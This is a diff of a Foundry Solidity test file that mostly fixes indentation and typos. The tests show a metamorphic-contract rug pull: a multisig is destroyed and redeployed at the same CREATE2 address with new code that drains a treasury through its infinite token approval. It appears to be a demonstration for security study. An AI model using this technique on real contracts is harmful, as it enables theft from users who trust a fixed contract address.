@@ -12,16 +12,16 @@ import "./TreasuryToken.sol";
 
 contract MetamorphicRug is Test {
 	TreasuryToken public token;
-    MetamorphicFactory public factoryContract;
+	MetamorphicFactory public factoryContract;
 	address public multisigAddr;
 	address public treasuryAddr;
 
-    function setUp() public {
-        factoryContract = new MetamorphicFactory();
-        bytes memory bytecode = abi.encodePacked(vm.getCode("Multisig.sol"));
+	function setUp() public {
+		factoryContract = new MetamorphicFactory();
+		bytes memory bytecode = abi.encodePacked(vm.getCode("Multisig.sol"));
 		multisigAddr =  factoryContract.deploy(1, bytecode);
 
-		// initilize multisig owner
+		// initialize multisig owner
 		address multisigOwner = address(1234);
 		vm.prank(multisigOwner);
 		Multisig(multisigAddr).initialize();
@@ -40,7 +40,7 @@ contract MetamorphicRug is Test {
 		assertEq(Treasury(treasuryAddr).owner(), multisigAddr);
 
 		// The selfdestruct call must be done in setUp() due to a foundry limitation: https://github.com/foundry-rs/foundry/issues/1543
-        address destroyAddr = address(new Destroy());
+		address destroyAddr = address(new Destroy());
 		vm.prank(multisigOwner);
 		Multisig(multisigAddr).transferFromContract(destroyAddr);
 
@@ -48,13 +48,13 @@ contract MetamorphicRug is Test {
 		vm.roll(block.number + 10);
 	}
 
-	// deploy new mutlisig with different contract which will drain all the funds from treasury
+	// deploy new multisig with different contract which will drain all the funds from treasury
 	function testMetamorphicRug() public {
 		// treasury set infinite approve to multisig contract
 		assertEq(token.allowance(treasuryAddr, multisigAddr), type(uint256).max);
 
-		// deploy new mutlisig with different code but with the same address
-        bytes memory bytecode = abi.encodePacked(vm.getCode("Multisig2.sol"));
+		// deploy new multisig with different code but with the same address
+		bytes memory bytecode = abi.encodePacked(vm.getCode("Multisig2.sol"));
 		address newMultisigAddr =  factoryContract.deploy(1, bytecode);
 		assertEq(newMultisigAddr, multisigAddr);
 		assertEq(Treasury(treasuryAddr).owner(), newMultisigAddr);
@@ -71,7 +71,7 @@ contract MetamorphicRug is Test {
 		Multisig2(multisigAddr).initialize();
 		assertEq(Multisig(multisigAddr).owner(), bob);
 
-		// new multisig contract can transfer all funds from treasruy to owner
+		// new multisig contract can transfer all funds from treasury to owner
 		vm.prank(bob);
 		Multisig2(multisigAddr).transferFromTreasury(treasuryAddr);
 		assertEq(token.balanceOf(treasuryAddr), 0 ether);
@@ -81,21 +81,21 @@ contract MetamorphicRug is Test {
 
 	// deploying the same contract with the same salt will produce the same address
 	function testTheSameContract() public {
-        bytes memory bytecode = abi.encodePacked(vm.getCode("Multisig.sol"));
+		bytes memory bytecode = abi.encodePacked(vm.getCode("Multisig.sol"));
 		address newMultisigAddr = factoryContract.deploy(1, bytecode);
 		assertEq(newMultisigAddr, multisigAddr);
 	}
 
 	// deploying the different contract with the same salt will produce the same address
 	function testDifferentContract() public {
-        bytes memory bytecode = abi.encodePacked(vm.getCode("Multisig2.sol"));
+		bytes memory bytecode = abi.encodePacked(vm.getCode("Multisig2.sol"));
 		address newMultisigAddr =  factoryContract.deploy(1, bytecode);
 		assertEq(newMultisigAddr, multisigAddr);
 	}
 
 	// deploying the same contract but with a different salt will produce a different address
 	function testDifferentSalt() public {
-        bytes memory bytecode = abi.encodePacked(vm.getCode("Multisig.sol"));
+		bytes memory bytecode = abi.encodePacked(vm.getCode("Multisig.sol"));
 		address newMultisigAddr =  factoryContract.deploy(2, bytecode);
 
 		// different salt will produce different address
